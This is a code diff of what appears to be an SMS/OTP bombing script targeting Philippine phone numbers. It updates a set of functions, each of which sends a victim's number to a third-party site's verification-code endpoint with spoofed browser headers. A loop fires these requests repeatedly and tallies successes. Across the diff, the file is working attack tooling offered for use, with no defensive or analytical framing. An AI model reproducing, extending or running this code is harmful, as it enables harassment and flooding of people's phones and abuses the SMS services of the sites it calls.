@@ -31,68 +31,11 @@ limit1 = 0
 field = 0
 slp = 0
 RUN = True
-
-# api0
-
-
-def otp(number):
-    global limit, field
-    if str(number[0]) == "0":
-        number = number.replace(str(number[0]), "63")
-    elif str(number[0]) == "+":
-        number = number.replace("+", "")
-    else:
-        pass
-    url = "https://admin.sunoro7778.site:443/api/sms/sendCode"
-    header = {'Host': 'admin.sunoro7778.site', 'Connection': 'keep-alive', 'Content-Length': '352', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42', 'Content-Type': 'application/json;charset=UTF-8',
-              'Origin': 'http://8.219.139.46', 'X-Requested-With': 'com.BlackRvip.blackrock', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'http://8.219.139.46/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
-    body = {"mobile": str(number), "type": 4,
-            "token": "null", "language": "en_us"}
-    try:
-        web = requests.post(url, headers=header, json=body)
-        r = json.loads(web.text)
-        if r["code"] == 1:
-            limit += 1
-            return True
-        else:
-            field += 1
-            return False
-    except:
-        field += 1
-        return False
-# api1
+debug = False
+debugError = False
 
 
-def otp1(number):
-    global limit, field
-    if str(number[0]) == "0":
-        number = number.replace(str(number[0]), "63")
-    elif str(number[0]) == "+":
-        number = number.replace("+", "")
-    else:
-        pass
-    url = "https://admin.sunoro7778.site:443/api/sms/sendCode"
-    header = {'Host': 'admin.sunoro7778.site', 'Connection': 'keep-alive', 'Content-Length': '66', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42', 'Content-Type': 'application/json;charset=UTF-8',
-              'Origin': 'http://8.219.139.46', 'X-Requested-With': 'com.BlackRvip.blackrock', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'http://8.219.139.46/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
-    body = {"mobile": str(number), "type": 1,
-            "token": "null", "language": "en_us"}
-    try:
-        web = requests.post(url, headers=header, json=body)
-        r = json.loads(web.text)
-        if r["code"] == 1:
-            limit += 1
-            return True
-        else:
-            field += 1
-            return False
-    except:
-        field += 1
-        return False
-# api2
-
-
-def otp2(number):
-    global limit, field
+def to9(number) -> str:
     if str(number[0]) == "0":
         number = str(number[1:])
     elif str(number[0]) == "+":
@@ -101,6 +44,89 @@ def otp2(number):
         number = str(number[:2])
     else:
         pass
+    return number
+
+def to639(number) -> str:
+    if str(number[0]) == "0":
+        number = number.replace(str(number[0]), "63")
+    elif str(number[0]) == "+":
+        number = number.replace("+", "")
+    else:
+        pass
+    return number
+
+def toplus63(number) -> str:
+    if str(number[0]) == "0":
+        number = "+63"+str(number[1:])
+    elif str(number[:2]) == "63":
+        number = "+"+str(number)
+    else:
+        pass
+    return number
+def to09(number) -> str:
+    if str(number[0]) == "+":
+        number = "0"+str(number[1:])
+    elif str(number[:2]) == "63":
+        number = "0"+str(number[2:])
+    else:
+        pass
+    return number
+# api0
+
+
+def otp(number):
+    global limit, field
+    number = to9(number=number)
+    url = "https://api2.cocacolahightech.com/login/sendCode"
+    header = {'Host': 'api2.cocacolahightech.com','Connection': 'keep-alive','Content-Length': '30','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','content-type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','Authorization': 'Bearer','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','sec-ch-ua-platform': '"Windows"','Accept': '*/*','Origin': 'https://www.cocacolahightech.com','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.cocacolahightech.com/','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
+    body = {"mobile": str(number), "code": "", "type": 0}
+    try:
+        web = requests.post(url, headers=header, json=body)
+        r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from cocacolahightech")
+        if r["code"] == 200:
+            limit += 1
+            return True
+        else:
+            field += 1
+            return False
+    except:
+        field += 1
+        if debugError == True:
+            print(f"\033[1;91mError cocacola\033[1;92m")
+        return False
+# api1
+
+
+def otp1(number):
+    global limit, field
+    number = to639(number=number)
+    url = "https://api.skpools.pro/api/v1/send/msg"
+    header = {'Host': 'api.skpools.pro','Connection': 'keep-alive','Content-Length': '35','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-platform': '"Windows"','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','Content-Type': 'application/json','Accept': '*/*','Origin': 'https://skpools.pro','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://skpools.pro/','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
+    body = {"phone":str(number),"type":"1"}
+    try:
+        web = requests.post(url, headers=header, json=body)
+        r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from skpools")
+        if r["code"] == 200:
+            limit += 1
+            return True
+        else:
+            field += 1
+            return False
+    except:
+        field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp1\033[1;92m")
+        return False
+# api2
+
+
+def otp2(number):
+    global limit, field
+    number = to9(number=number)
 
     def bencoder(string):
         string = covert_to_string(string)
@@ -135,6 +161,8 @@ def otp2(number):
     try:
         web = requests.post(url, headers=header, data=body)
         r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from ma7hrte")
         if r["code"] == 0:
             limit += 1
             return True
@@ -143,18 +171,15 @@ def otp2(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp2\033[1;92m")
         return False
 # api3
 
 
 def otp3(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = "+63"+str(number[1:])
-    elif str(number[:2]) == "63":
-        number = "+"+str(number)
-    else:
-        pass
+    number = toplus63(number=number)
     url = "https://graphql.toktok.ph:2096/auth/graphql/"
     header = {'accept': '*/*', 'authorization': '', 'Content-Type': 'application/json', 'Content-Length': '199',
               'Host': 'graphql.toktok.ph:2096', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.1'}
@@ -163,6 +188,8 @@ def otp3(number):
     try:
         web = requests.post(url, headers=header, json=body)
         r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from toktok")
         if r["data"]["loginRegister"] == "REGISTER":
             limit += 1
             return True
@@ -171,18 +198,15 @@ def otp3(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp3\033[1;92m")
         return False
 # api4
 
 
 def otp4(number):
     global limit, field
-    if str(number[0]) == "+":
-        number = "0"+str(number[1:])
-    elif str(number[:2]) == "63":
-        number = "0"+str(number[2:])
-    else:
-        pass
+    number = to09(number=number)
     url = "http://8.212.181.240:80/index/user/send_code"
     header = {'Device-Id': '3076685aef999931', 'App-Id': 'UYJEeAtD', 'Authorization': '', 'Content-Type': 'application/json; charset=UTF-8',
               'Content-Length': '23', 'Host': '8.212.181.240', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.0'}
@@ -190,6 +214,8 @@ def otp4(number):
     try:
         web = requests.post(url, headers=header, json=body)
         r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from 777pub 1")
         if r["msg"] == "success":
             limit += 1
             return True
@@ -198,18 +224,15 @@ def otp4(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp4\033[1;92m")
         return False
 # api5
 
 
 def otp5(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = number.replace(str(number[0]), "63")
-    elif str(number[0]) == "+":
-        number = number.replace("+", "")
-    else:
-        pass
+    number = to639(number=number)
     url = "https://api.777pub.app:443/account/get_code"
     header = {'Host': 'api.777pub.app', 'Connection': 'keep-alive', 'Content-Length': '83', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser', 'Content-Type': 'application/x-www-form-urlencoded',
               'Accept': '*/*', 'Origin': 'https://www.777pub.com', 'X-Requested-With': 'com.happythree.sevengames.pubshow', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.777pub.com/?f=UIHall', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
@@ -218,6 +241,8 @@ def otp5(number):
     try:
         web = requests.post(url, headers=header, data=body)
         r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from 777pub")
         if r["code"] == 0:
             limit += 1
             return True
@@ -226,26 +251,23 @@ def otp5(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp5\033[1;92m")
         return False
 # api6
 
 
 def otp6(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = str(number[1:])
-    elif str(number[0]) == "+":
-        number = str(number[3:])
-    elif str(number[:2]) == "63":
-        number = str(number[2:])
-    else:
-        pass
+    number = to9(number=number)
     url = "https://www.qmsyrr.com/index/Index/smsCode.html"
     header = {'Host': 'www.qmsyrr.com', 'Connection': 'keep-alive', 'Content-Length': '17', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?0',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46', 'sec-ch-ua-platform': '"Windows"', 'sec-gpc': '1', 'Origin': 'https://www.qmsyrr.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.qmsyrr.com/index/index/login.html?code=4927714', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9'}
     body = {"mobile": str(number)}
     try:
         web = requests.post(url, headers=header, data=body)
+        if debug == True:
+            print(f"{web.status_code} from qmsyrr")
         if int(web.status_code) == 200:
             limit += 1
             return True
@@ -254,30 +276,27 @@ def otp6(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp6\033[1;92m")
         return False
 # api7
 
 
 def otp7(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = str(number[1:])
-    elif str(number[0]) == "+":
-        number = str(number[3:])
-    elif str(number[:2]) == "63":
-        number = str(number[2:])
-    else:
-        pass
+    number = to9(number=number)
     session = requests.Session()
-    session.get("https://www.711shop.net:443/mobile/index/index.html")
-    url = "https://www.711shop.net:443/sms/getCode"
-    header = {'Host': 'www.711shop.net', 'Connection': 'keep-alive', 'Content-Length': str(random.randint(13, 18)), 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46',
-              'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.711shop.net', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.711shop.net/mobile/forget.html', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
-    body = {"phone": str(number)}
+    session.get('https://gplayer77.com')
+    url = 'https://gplayer77.com/api/vcode/sendVcodeForNotExistUser'
+    header = {'Host': 'gplayer77.com','Connection': 'keep-alive','Content-Length': '32','sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','Accept': 'application/json, text/plain, */*','Content-Type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60','sec-ch-ua-platform': '"Windows"','Origin': 'https://gplayer77.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://gplayer77.com/register','Accept-Encoding': 'gzip','Accept-Language': 'en-US,en;q=0.9'}
+    body = {"mobile": str(number), "countryCode": 63}
     web = session.post(url, headers=header, data=body)
     try:
         web = session.post(url, headers=header, data=body)
-        if int(web.status_code) == 200:
+        r = json.loads(web.text)
+        if debug == True:
+            print(f"{r} from gplayer77")
+        if r['code'] == 200:
             limit += 1
             return True
         else:
@@ -285,20 +304,15 @@ def otp7(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp7\033[1;92m")
         return False
 # api8
 
 
 def otp8(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = str(number[1:])
-    elif str(number[0]) == "+":
-        number = str(number[3:])
-    elif str(number[:2]) == "63":
-        number = str(number[2:])
-    else:
-        pass
+    number = to9(number=number)
     session = requests.Session()
     url = "https://api.ayala-group.top/sendSMS.do"
     header = {'Host': 'api.ayala-group.top', 'Connection': 'keep-alive', 'Content-Length': '24', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
@@ -306,6 +320,8 @@ def otp8(number):
     body = {"mobile": str(number), "type": "2"}
     try:
         web = session.post(url, headers=header, data=body)
+        if debug == True:
+            print(f"{web.status_code} from ayala group 1")
         if int(web.status_code) == 200:
             limit += 1
             return True
@@ -314,20 +330,15 @@ def otp8(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp8\033[1;92m")
         return False
 # api9
 
 
 def otp9(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = str(number[1:])
-    elif str(number[0]) == "+":
-        number = str(number[3:])
-    elif str(number[:2]) == "63":
-        number = str(number[2:])
-    else:
-        pass
+    number = to9(number=number)
     session = requests.Session()
     url = "https://api.ayala-group.top/sendSMS.do"
     header = {'Host': 'api.ayala-group.top', 'Connection': 'keep-alive', 'Content-Length': '24', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0',
@@ -335,6 +346,8 @@ def otp9(number):
     body = {"mobile": str(number), "type": "3"}
     try:
         web = session.post(url, headers=header, data=body)
+        if debug == True:
+            print(f"{web.status_code} from ayala group")
         if int(web.status_code) == 200:
             limit += 1
             return True
@@ -343,25 +356,22 @@ def otp9(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp9\033[1;92m")
         return False
 # api10
 
 
 def otp10(number):
     global limit, field
-    if str(number[0]) == "0":
-        number = str(number[1:])
-    elif str(number[0]) == "+":
-        number = str(number[3:])
-    elif str(number[:2]) == "63":
-        number = str(number[2:])
-    else:
-        pass
+    number = to9(number=number)
     session = requests.Session()
     url = "https://api.yhaphtai.com/home/login/register_code"
     body = {"phone": str(number), "captcha": ""}
     try:
         web = session.post(url, json=body)
+        if debug == True:
+            print(f"{web.status_code} from yhaphtai")
         if int(web.status_code) == 200:
             limit += 1
             return True
@@ -370,6 +380,8 @@ def otp10(number):
             return False
     except:
         field += 1
+        if debugError == True:
+            print(f"\033[1;91mError otp10\033[1;92m")
         return False
 
 # you can add api and put it in the box to run
@@ -388,6 +400,10 @@ def bomber(function):
 
             if int(limit) >= int(limit1):
                 RUN = False
+        else:
+            sys.stdout.write(u"\033[1000D\033[1;92mSuccess: \033[1;97m{} \033[1;92mError: \033[1;91m{} \033[1;92m".format(
+                str(limit), str(field)))
+            sys.stdout.flush()
         time.sleep(int(slp))
 # picker input
 
